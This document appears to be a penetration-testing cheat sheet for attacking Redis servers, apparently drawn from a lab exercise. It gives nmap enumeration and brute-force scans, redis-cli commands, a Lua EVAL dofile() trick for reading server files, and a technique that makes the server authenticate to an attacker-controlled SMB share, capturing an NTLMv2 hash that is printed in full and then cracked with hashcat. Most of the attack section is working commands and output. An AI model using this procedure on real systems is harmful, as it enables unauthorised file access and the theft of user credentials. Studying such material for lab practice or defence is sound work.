Redis is an open-source, in-memory data structure store used as a database, cache, and message broker. It supports various data types, offers high performance with low latency, and provides features like persistence, replication, and pub/sub messaging, making it ideal for real-time applications and high-performance scenarios.<br>

>Default Port: 6379

nmap
-----
```
sudo nmap -p 6379 -A $IP
sudo nmap -sV -p 6379 --script=redis-info.nse $IP
sudo nmap -sV -p 6379 --script=redis-brute.nse $IP
```
enumeration
-----------
```
redis-cli -h $IP
redis-cli -h $IP --pass password1234

redis> info
redis> INFO
redis> client list
redis> CONFIG GET *   # displays the current config of the redis server. 
````

exploits
---------

Redis can execute Lua scripts (in a sandbox, more on that later) via the “EVAL” command. The sandbox allows the ```dofile()``` command (WHY???). It can be used to **enumerate files and directories**. No specific privilege is needed by Redis… If the Lua script is syntaxically invalid or attempts to set global variables, **the error messages will leak some content of the target file**.

**access file on server:**
```
redis-cli -h $IP
> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
```
**obtaining the NTLMv2 Hash / User’s password**

Now that we know that we can access files on the server, we can try to do some more advanced stuff. We could try to access a remote share. This would leak the NTLM hash of the user as he/she tries to authenticate himself/herself. If this remote share is on our machine, we could attempt to log the access and thus get access to the hash.

<br>

For that, we first set up a listener using ```smbserver.py```:
```
sudo /home/kali/.local/bin/smbserver.py shared ~/test -smb2support
```

Then, we use the redis eval technique to access the exposed share:
```
redis-cli -h <target ip> eval "dofile('//<our ip>/shared')" 0 
```
We will got an error like this :
```
(error) ERR Error running script (call to f_3019311747b91dc48629be28b00631986c617817): @user_script:1: cannot open //10.8.14.69//shared: Invalid argument 
```
But the user hash we will be exposed through our smb server:
```
[*] Closing down connection (10.10.49.209,49896)
[*] Remaining connections []
[*] Incoming connection (10.10.49.209,49916)
[*] AUTHENTICATE_MESSAGE (VULNNET\enterprise-security,VULNNET-BC3TCK1)
[*] User VULNNET-BC3TCK1\enterprise-security authenticated successfully
[*] enterprise-security::VULNNET:aaaaaaaaaaaaaaaa:386b865cb1193740e045f6e47e1e36fb:010100000000000000cd31f8890bdb017eeb9e3a31aeef3700000000010010007300700057006b006a0057004c006b00030010007300700057006b006a0057004c006b00020010007700570062007200500061004500780004001000770057006200720050006100450078000700080000cd31f8890bdb01060004000200000008003000300000000000000000000000003000009d421d079a542bc0c77c58828668731b9291737d6e1c4186400fe57de2a70fae0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0038002e00310034002e00360039000000000000000000
[*] Closing down connection (10.10.49.209,49916)
[*] Remaining connections []
```
**Crack NTLMv2 hash**

After that we need to crack this hash to dump the user password.<br>
first, we need to create tha hash file:
```
$ nano hash
$ cat hash
enterprise-security::VULNNET:aaaaaaaaaaaaaaaa:386b865cb1193740e045f6e47e1e36fb:010100000000000000cd31f8890bdb017eeb9e3a31aeef3700000000010010007300700057006b006a0057004c006b00030010007300700057006b006a0057004c006b00020010007700570062007200500061004500780004001000770057006200720050006100450078000700080000cd31f8890bdb01060004000200000008003000300000000000000000000000003000009d421d079a542bc0c77c58828668731b9291737d6e1c4186400fe57de2a70fae0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0038002e00310034002e00360039000000000000000000
```
then :
```
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

